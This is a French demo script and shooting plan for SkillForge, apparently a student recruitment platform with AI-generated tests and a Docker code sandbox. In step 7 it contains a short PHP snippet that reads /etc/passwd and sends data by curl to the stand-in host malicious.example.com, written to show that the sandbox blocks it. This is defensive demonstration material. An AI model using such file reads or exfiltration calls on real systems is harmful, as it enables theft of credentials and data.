# Scénario complet de la démonstration vidéo

Durée cible : **9 à 10 minutes**
Objectif : montrer SkillForge en conditions réelles, du CV au verdict final, **en mettant en avant les éléments différenciants** attendus par un jury M2 : sécurité prouvée, multi-fournisseurs IA, anti-fraude, souveraineté des données, auditabilité.

Ce document sert à la fois de **plan de tournage** pour la vidéo et de **script parlé** en voix off pendant l'enregistrement.

---

## Contexte du scénario

**Situation** : Tsarajoro reçoit une candidature pour un poste de **développeur PHP / Laravel senior**. Le recruteur va utiliser SkillForge pour évaluer le candidat de bout en bout.

**Personnages** :
- **Le recruteur** : équipe technique de Tsarajoro (rôle joué par toi lors de la démo)
- **Le candidat** : Miora RAKOTONIRINA, développeur PHP / Laravel 6 ans d'expérience (voir `00_CV_CANDIDAT_DEMO.md`)

**Poste ouvert** : Développeur backend PHP / Laravel senior

**Points différenciants à démontrer visuellement (les 5 obligatoires pour un jury M2)** :
1. **Sécurité prouvée** : montrer une attaque bloquée par la sandbox en direct
2. **Multi-LLM** : montrer les 6 fournisseurs et la bascule par configuration
3. **Anti-fraude comportementale** : provoquer des événements et montrer leur détection
4. **Souveraineté des données** : évoquer explicitement Ollama et l'hébergement local
5. **Auditabilité** : montrer l'historique complet des évaluations

---

## Séquençage de la vidéo (9 étapes)

### Étape 1 — Introduction et connexion (0:00 - 0:40)

**Ce que tu montres** :
- Écran d'accueil de SkillForge (`http://localhost:5173`)
- Page de connexion
- Saisie de l'e-mail et du mot de passe du recruteur
- Arrivée sur le tableau de bord

**Ce que tu dis en voix off** :
> Voici SkillForge, la plateforme de recrutement technique développée pour Tsarajoro. Je me connecte avec un compte recruteur.
>
> L'authentification est sécurisée par un jeton JWT signé et un hachage Argon2id des mots de passe.
>
> Une fois authentifié, j'arrive sur le tableau de bord qui présente les évaluations en cours, les candidats invités et les rapports générés.

**Points à mettre en avant** :
- Design sobre et professionnel
- Authentification sécurisée (JWT + Argon2id)

---

### Étape 2 — Création d'une nouvelle évaluation + choix du fournisseur IA (0:40 - 2:00)

**Ce que tu montres** :
- Clic sur « Nouvelle évaluation »
- Formulaire de création :
  - **Titre** : `Développeur PHP / Laravel senior — poste interne`
  - **Description** : `Recrutement d'un développeur backend senior pour renforcer l'équipe technique Tsarajoro`
  - **Profil recherché** : sélection dans la liste (ex : `Développeur backend`)
  - **Niveau visé** : `Senior (5 à 8 ans)`
- Upload du CV : sélection du fichier `Miora_RAKOTONIRINA_CV.pdf`
- **NOUVEAU** : passer brièvement sur l'onglet ou le fichier de configuration qui liste les 6 fournisseurs IA disponibles (OpenAI, Groq, Gemini, Claude, GitHub Models, Ollama)
- Clic sur « Analyser le CV avec l'IA »

**Ce que tu dis en voix off** :
> Je crée une nouvelle évaluation pour un poste de développeur backend senior.
>
> J'importe le CV du candidat, Miora RAKOTONIRINA, un développeur PHP Laravel avec six ans d'expérience.
>
> **[Pointer la config multi-LLM]** Avant de lancer l'analyse, je vous montre rapidement la particularité de SkillForge : **six fournisseurs d'intelligence artificielle sont connectés** — OpenAI, Groq, Google Gemini, Anthropic Claude, GitHub Models et Ollama en local. Le choix se fait par simple configuration.
>
> Pour cette démo, j'utilise OpenAI. Mais je peux basculer en une commande vers un autre fournisseur, sans redémarrer l'application ni modifier une seule ligne de code.
>
> **Cette architecture a montré sa valeur en pratique** : lors du retrait de GitHub Models pendant le stage, j'ai basculé vers OpenAI en moins d'une heure.

**Points à mettre en avant** :
- La simplicité du formulaire
- **Le multi-LLM en configuration** (différenciant fort vs concurrents)
- L'anecdote de la bascule GitHub Models (preuve empirique)

---

### Étape 3 — Analyse du CV et détection des compétences (2:00 - 2:45)

**Ce que tu montres** :
- Écran d'analyse : la liste des compétences détectées apparaît
  - **Compétences fortes détectées** : PHP 8, Laravel 10 et 11, MySQL, Vue.js, Docker, Git
  - **Compétences secondaires** : Symfony, GraphQL, Redis
  - **Compétences transverses** : Scrum, revue de code, encadrement
- Chaque compétence est associée à un niveau estimé (Débutant / Intermédiaire / Avancé)
- Le recruteur peut cocher / décocher les compétences qu'il souhaite tester

**Ce que tu dis en voix off** :
> En moins de 30 secondes, l'IA a détecté une dizaine de compétences techniques dans le CV.
>
> Les compétences fortes ressortent en premier : PHP, Laravel, MySQL, Vue.js. Les compétences secondaires comme Symfony ou GraphQL sont détectées mais notées comme moins prioritaires.
>
> **À ce stade, le recruteur garde la main** : il peut sélectionner les compétences qu'il souhaite réellement tester lors de l'évaluation. Ici, je vais garder PHP, Laravel, MySQL et Docker.
>
> Ce principe « l'IA propose, l'humain décide » est fondamental dans SkillForge : chaque décision automatique reste validable par le recruteur.

**Points à mettre en avant** :
- La précision de la détection IA
- Le contrôle humain préservé
- La rapidité (< 30 s)

---

### Étape 4 — Génération adaptative des questions (2:45 - 4:00)

**Ce que tu montres** :
- Clic sur « Générer les questions »
- Écran de progression : « Génération en cours... »
- Apparition d'une liste de **8 à 12 questions générées** :
  - **3 QCM** ciblés sur PHP et Laravel (ex : "Quelle méthode d'Eloquent permet d'ajouter une clause WHERE dynamique ?")
  - **2 exercices de code PHP** (ex : "Écrire une fonction Laravel qui retourne le total d'une commande à partir de son ID")
  - **1 cas pratique** (ex : "Décrire l'architecture recommandée pour un système de notifications en temps réel avec Laravel")
- Le recruteur peut :
  - Cocher / décocher chaque question
  - Modifier le libellé si nécessaire
  - Ajuster le niveau de difficulté

**Ce que tu dis en voix off** :
> À partir des compétences retenues, SkillForge génère automatiquement une évaluation adaptée au profil.
>
> Trois types de questions sont produits : des QCM pour vérifier les connaissances théoriques, des exercices de code pour évaluer la pratique, et un cas pratique pour tester le raisonnement d'architecture.
>
> Chaque question est **validée manuellement par le recruteur** avant l'envoi. Il peut la modifier, la supprimer ou en ajuster la difficulté.
>
> Je valide les 8 questions et je passe à l'invitation du candidat.

**Points à mettre en avant** :
- La diversité des questions (QCM, code, cas pratique)
- L'adaptation au profil détecté
- La validation humaine

---

### Étape 5 — Invitation du candidat (4:00 - 4:45)

**Ce que tu montres** :
- Écran d'invitation :
  - Saisie de l'e-mail du candidat : `miora.rakotonirina.dev@example.com`
  - Saisie du prénom / nom : `Miora RAKOTONIRINA`
  - Choix de la durée : `60 minutes` (par défaut)
  - Choix de la date limite : `dans 7 jours`
- Clic sur « Envoyer l'invitation »
- Confirmation : un e-mail est envoyé au candidat avec un lien unique et un code d'accès
- Vue de l'invitation dans **Mailpit** (outil de mail de test, `http://localhost:8025`) pour montrer l'e-mail réellement reçu

**Ce que tu dis en voix off** :
> L'évaluation est prête, il ne reste plus qu'à inviter le candidat.
>
> Je renseigne son adresse e-mail. Il recevra un lien unique et un code d'accès à usage unique, valable pendant sept jours.
>
> Pour la démonstration, je vous montre l'e-mail réellement reçu via Mailpit, l'outil de messagerie de test intégré.

**Points à mettre en avant** :
- L'expédition réelle de l'e-mail (Mailpit prouve que ça marche)
- Sécurité : lien unique + code d'accès + expiration

---

### Étape 6 — Passation du test par le candidat, avec anti-fraude en action (4:45 - 6:30)

*Se mettre dans la peau du candidat.*

**Ce que tu montres** :
- Ouvrir le lien d'invitation dans un nouvel onglet (idéalement en mode navigation privée)
- Saisie du code d'accès reçu par e-mail
- Arrivée sur la page de passation :
  - Écran d'accueil avec les règles (durée, nombre de questions, anti-fraude activée)
  - Clic sur « Commencer l'évaluation »
- Enchaînement de 2 questions représentatives :
  - **Un QCM** : lecture de l'énoncé, sélection d'une réponse, validation
  - **Un exercice de code** :
    - Ouverture de l'éditeur Monaco intégré
    - Saisie de code PHP correct → clic sur « Exécuter »
    - Sandbox lance le code → 2 tests unitaires sur 3 passent
- **NOUVEAU — Provoquer volontairement l'anti-fraude** :
  - **Faire Ctrl+C / Ctrl+V** dans l'éditeur de code (coller du code depuis presse-papier externe)
  - **Changer d'onglet** vers le navigateur puis revenir
  - Une petite notification discrète apparaît : « Un événement a été enregistré »
- Cliquer sur « Terminer l'évaluation »
- Écran de confirmation pour le candidat

**Ce que tu dis en voix off** :
> Le candidat reçoit son invitation, saisit son code d'accès et commence l'évaluation.
>
> Sur cet écran d'accueil, il voit les règles : durée limitée à une heure, huit questions au total, et un dispositif anti-fraude activé.
>
> Je vous montre deux questions représentatives.
>
> D'abord un QCM : le candidat lit, choisit une réponse, valide.
>
> Ensuite un exercice de code, cœur de la plateforme. Le candidat écrit son code dans l'éditeur Monaco intégré, puis clique sur « Exécuter ». **Le code est envoyé à la sandbox Docker**, exécuté dans un conteneur totalement isolé, et le résultat des tests unitaires est affiché.
>
> **[Faire Ctrl+V et changement d'onglet]** À ce stade, je simule volontairement deux comportements suspects : un copier-coller et un changement d'onglet. Vous voyez qu'une notification s'affiche discrètement : ces événements sont **enregistrés en temps réel** dans la base et remonteront dans le rapport final du recruteur.
>
> Une fois terminé, le candidat valide sa soumission. **À partir de ce moment, il ne peut plus modifier ses réponses.**

**Points à mettre en avant** :
- Éditeur de code professionnel (Monaco = celui de VSCode)
- Exécution réelle dans la sandbox Docker (pas de mock)
- Retour immédiat sur les tests unitaires
- **Anti-fraude déclenchée en direct** (visuellement fort)
- Sécurité de la soumission (irréversible)

---

### Étape 7 — Test de la sandbox : blocage d'une attaque en direct (6:30 - 7:15)

**Ce que tu montres** :
*Rester en mode candidat, ouvrir un nouvel exercice de test ou revenir sur l'éditeur.*

- Dans l'éditeur de code, **taper une tentative d'attaque simple** :

```php
<?php
// Tentative de lecture des mots de passe système
$data = file_get_contents('/etc/passwd');
echo $data;

// Tentative de connexion réseau sortante
$ch = curl_init('https://malicious.example.com/steal-data');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
```

- Clic sur « Exécuter »
- La sandbox répond avec un message explicite :
  - **Erreur d'exécution** : « Permission denied » ou « Network unreachable »
  - Le fichier `/etc/passwd` n'est pas accessible
  - L'appel réseau échoue

**Ce que tu dis en voix off** :
> Avant de terminer, je vous propose une démonstration importante : **la sécurité de la sandbox en action**.
>
> J'écris ici volontairement du code malveillant : une tentative de lire le fichier des mots de passe système, et une tentative de connexion réseau vers un serveur externe pour exfiltrer des données.
>
> Si la sandbox n'était pas sécurisée, un candidat malveillant pourrait accéder aux données de Tsarajoro ou attaquer votre infrastructure.
>
> **[Exécuter]** Regardez le résultat : la sandbox refuse la lecture du fichier système et bloque totalement l'appel réseau. Le conteneur est isolé par **sept verrous cumulés** — seccomp, cap-drop, network=none, read-only rootfs, pids-limit, memory-limit et utilisateur non-root.
>
> Cette isolation a été validée par un **harnais reproductible de 50 scénarios d'attaque, avec zéro évasion détectée** à la clôture du projet.

**Points à mettre en avant** :
- **La sécurité prouvée EN DIRECT** — moment fort de la démo
- Le fichier `/etc/passwd` reste inaccessible
- L'appel réseau échoue
- La preuve empirique (50 attaques, 0 évasion)

---

### Étape 8 — Consultation du rapport par le recruteur avec section anti-fraude (7:15 - 8:45)

**Ce que tu montres** :
*Revenir sur le compte recruteur.*

- Sur le tableau de bord : notification « Nouveau rapport disponible pour Miora RAKOTONIRINA »
- Clic sur le rapport
- Écran du rapport détaillé :
  - **Score global** : par exemple 76/100
  - **Anneau de score** visuel (ScoreRing) au centre
  - **Recommandation IA** : « Candidat prometteur, à retenir pour un entretien technique approfondi »
  - **Détail par compétence** :
    - PHP : 85/100
    - Laravel : 82/100
    - MySQL : 74/100
    - Docker : 60/100
  - **Forces identifiées** : « Maîtrise solide de PHP et Laravel, bonne connaissance des ORM »
  - **Faiblesses identifiées** : « Docker moins approfondi que le CV le suggère »
  - **Compte rendu détaillé** question par question
- **NOUVEAU — Section anti-fraude bien visible** :
  - Badge orange : **« 2 événements détectés »**
  - Détail :
    - `14:32:17 — Copier-coller entrant sur l'éditeur de code`
    - `14:33:04 — Changement d'onglet (durée : 8 secondes)`
  - Note d'accompagnement : « Ces événements ne remettent pas nécessairement en cause l'évaluation. Le recruteur reste seul décisionnaire. »

**Ce que tu dis en voix off** :
> De retour côté recruteur, un rapport est immédiatement disponible.
>
> Le score global est de 76 sur 100. Le rapport détaille les compétences testées : PHP et Laravel sont bien maîtrisés, MySQL est solide, Docker un peu moins profond que ce que suggérait le CV.
>
> **La recommandation est produite par l'IA** : le candidat est prometteur, à retenir pour un entretien technique approfondi.
>
> **[Pointer la section anti-fraude]** Regardez ici la **section anti-fraude** : les deux événements que j'ai simulés tout à l'heure sont remontés. Un copier-coller à 14h32, un changement d'onglet à 14h33.
>
> **Le recruteur voit tout, mais reste seul décisionnaire** : ces événements ne condamnent pas automatiquement le candidat, ils l'informent.
>
> Chaque question est aussi consultable individuellement, avec la réponse du candidat et le commentaire de l'IA.

**Points à mettre en avant** :
- Le rapport est visuel, lisible, actionnable
- Le score n'est PAS un simple chiffre — il est expliqué et détaillé
- **L'anti-fraude est transparent et exploitable** (moment fort)
- L'humain garde la décision finale

---

### Étape 9 — Audit trail, souveraineté et conclusion (8:45 - 9:45)

**Ce que tu montres** :
- Retour sur le tableau de bord analytique
- Aperçu global :
  - Nombre d'évaluations créées
  - Nombre de candidats évalués
  - Taux de réussite moyen
- Vue « Liste des évaluations » avec filtres (nom, statut, date) — tri chronologique
- Vue « Historique » : liste des actions récentes (audit trail)
- Optionnel : ouvrir un terminal et faire `docker ps` pour montrer qu'aucun conteneur ne persiste après l'exécution

**Ce que tu dis en voix off** :
> Enfin, SkillForge propose une vue analytique globale et un historique complet.
>
> Le recruteur peut suivre l'historique des évaluations, filtrer par statut ou par compétence, et consulter des statistiques agrégées.
>
> **Chaque action est tracée** : création d'évaluation, invitation envoyée, passation démarrée, rapport généré. Cette traçabilité est essentielle pour l'audit et la conformité RGPD.
>
> **Un dernier point important sur la souveraineté des données** : cette démo utilise OpenAI, mais SkillForge peut aussi tourner **100 % en local via Ollama**. Dans ce mode, aucune donnée candidat ne quitte l'infrastructure de Tsarajoro — un critère majeur pour la conformité RGPD et pour les clients sensibles.
>
> Voilà pour la démonstration : de l'analyse du CV à la consultation du rapport final, en passant par la sécurité prouvée de la sandbox et le respect de la vie privée. SkillForge accompagne le recruteur à chaque étape, avec l'intelligence artificielle en support et l'humain en contrôle.

**Fin de la vidéo.**

---

## Checklist technique avant l'enregistrement

### Environnement local prêt

- [ ] Backend applicatif démarré (`mvn spring-boot:run` dans `apps/backend-app`)
- [ ] Backend sandbox démarré (`mvn spring-boot:run` dans `apps/backend-sandbox`)
- [ ] Frontend démarré (`npm run dev` dans `apps/frontend-web`)
- [ ] PostgreSQL et Mailpit démarrés via Docker Compose
- [ ] LLM_PROVIDER configuré sur `openai` avec une clé valide
- [ ] Base de données propre (pas de vieilles données parasites)

### Données de démo préparées

- [ ] Fichier CV `Miora_RAKOTONIRINA_CV.pdf` créé (générer à partir du fichier `00_CV_CANDIDAT_DEMO.md`)
- [ ] Compte recruteur créé : `recruteur@tsarajoro.demo` / mot de passe simple
- [ ] Réponses préparées pour les exercices de code (code PHP correct et prêt à coller)
- [ ] Réponse préparée pour le cas pratique (3 à 5 lignes)
- [ ] **Code d'attaque PHP prêt à coller** (voir étape 7)

### Outils d'enregistrement

- [ ] Logiciel de capture d'écran (**OBS Studio** recommandé — gratuit, dispo sur Arch)
- [ ] Résolution : **1920×1080 minimum** (idéalement 2560×1440)
- [ ] Frame rate : **30 fps** (pas besoin de plus)
- [ ] Microphone testé (voix off claire, sans souffle)
- [ ] Fond sonore silencieux

### Enregistrement

- [ ] Faire 2 ou 3 essais avant l'enregistrement définitif
- [ ] Parler à voix normale, calme, articulée
- [ ] Ne pas s'excuser en cas d'erreur : soit couper, soit continuer
- [ ] Fermer les autres onglets et notifications
- [ ] Curseur souris visible (paramètre OBS)
- [ ] Zoom sur les zones importantes si le texte est petit

### Post-production

- [ ] Couper le début et la fin (pas de temps mort)
- [ ] Éventuellement accélérer x1.5 les phases de saisie manuelle du code (le clavier n'est pas intéressant)
- [ ] Ajouter des sous-titres si tu peux (bonus qualité)
- [ ] Vérifier la durée finale : **entre 9 et 10 minutes strictement**

---

## Notes de tournage

**À éviter absolument** :
- Bugs visibles à l'écran (préparer, tester avant)
- Données confidentielles réelles à l'écran (utiliser des données démo)
- Temps morts longs (accélérer ou couper)
- Voix off mal préparée (répéter le script d'abord)
- Résolution basse ou zoom insuffisant sur le code

**Plan de secours** :
Si le jour de la soutenance le réseau internet est instable, il faut :
- Avoir la vidéo enregistrée en local sur ton PC
- Avoir aussi une copie sur clé USB en secours
- Avoir un lecteur vidéo qui marche hors ligne (VLC)

---

## Timing détaillé de la vidéo

| Étape | Contenu | Durée cible | Cumul |
|---|---|---|---|
| 1 | Introduction + connexion | 0:40 | 0:40 |
| 2 | Création évaluation + multi-LLM | 1:20 | 2:00 |
| 3 | Analyse CV et compétences | 0:45 | 2:45 |
| 4 | Génération adaptative | 1:15 | 4:00 |
| 5 | Invitation candidat (Mailpit) | 0:45 | 4:45 |
| 6 | Passation + anti-fraude en direct | 1:45 | 6:30 |
| **7** | **Sandbox : attaque bloquée en direct** | **0:45** | **7:15** |
| 8 | Rapport + section anti-fraude | 1:30 | 8:45 |
| 9 | Audit trail + souveraineté | 1:00 | 9:45 |

**Total : 9 min 45** — dans la fourchette 9-10 min visée.

---

## Ce que le jury doit retenir de cette vidéo

Cinq messages forts, tous démontrés visuellement :

1. **La plateforme fonctionne vraiment**, pas juste sur le papier — parcours complet du CV au rapport
2. **L'IA n'est pas gadget** — utilisée à chaque étape (analyse, génération, verdict) avec 6 fournisseurs interchangeables
3. **La sécurité est prouvée en direct** — attaque bloquée par la sandbox devant le jury, sans montage
4. **L'anti-fraude est opérationnel** — événements simulés puis détectés dans le rapport
5. **La souveraineté est possible** — mode Ollama 100 % local pour la conformité RGPD

Ces cinq éléments transforment une démo « fonctionnelle correcte » en démo « M2 impressionnante » :
- Sans le point 3 (sandbox en action), la sécurité reste une déclaration
- Sans le point 4 (anti-fraude en direct), c'est une fonctionnalité fantôme
- Sans le point 5 (Ollama), le jury RGPD sera inquiet
- Sans le point 2 (multi-LLM), c'est une plateforme comme une autre

**C'est la combinaison de ces cinq démonstrations visuelles qui fait la différence.**
